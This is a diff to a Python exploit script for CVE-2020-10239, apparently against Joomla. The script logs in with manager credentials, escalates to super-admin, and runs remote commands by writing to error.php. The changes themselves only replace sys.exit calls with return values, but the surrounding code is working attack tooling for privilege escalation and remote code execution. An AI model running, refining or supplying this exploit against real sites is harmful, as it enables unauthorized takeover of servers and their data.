@@ -2,7 +2,6 @@
 # See the file 'LICENSE' for copying permission.
 # CVE-2020-10239
 
-import sys
 import requests
 import re
 import random
@@ -36,7 +35,7 @@ def try_admin_login(sess, profile_url, uname, upass):
     resp = sess.post(admin_profile_url, data=data, verify=False)
     if 'task=profile.edit' not in resp.text:
         print(f'{Fore.RED}Manager Login Failure!{Style.RESET_ALL}')
-        return None
+        return False  # Changed from None to False for consistency
     print(f'{Fore.GREEN}{Style.BRIGHT}Manager Login Successful! Username: {uname}, Password: {upass}{Style.RESET_ALL}')
     return True
 
@@ -46,7 +45,7 @@ def check_admin(sess, profile_url):
     token = extract_token(resp)
     if not token:
         print(f"{Fore.RED}{Style.BRIGHT}You are not Manager!{Style.RESET_ALL}")
-        sys.exit()
+        return None  # Return None if not a manager
     return token
 
 def getManagerId(profile_url, sess):
@@ -114,7 +113,7 @@ def checkSuperAdmin(profile_url, sess):
         return False
     else:
         print(f"{Fore.GREEN}{Style.BRIGHT}You are now Super-admin!{Style.RESET_ALL}")
-        return True
+        return True  # Changed to return True for consistency
 
 def rce(sess, profile_url, cmd, token):
     filename = 'error.php'
@@ -143,12 +142,17 @@ def scan_cve_2020_10239(target):
     print(f'{Fore.CYAN}{Style.BRIGHT}Target: {target}{Style.RESET_ALL}')
     
     if not try_admin_login(sess, target, uname, upass):
-        sys.exit()
+        return False
 
     token = check_admin(sess, target)
+    if token is None:  # Check if token is None after admin check
+        return False
 
     createNewField(target, sess, token)
 
     if checkSuperAdmin(target, sess):
         rce(sess, target, cmd, token)
+        return True  # Return True after successful RCE
+
+    return False  # Return False if Super-admin check fails
 
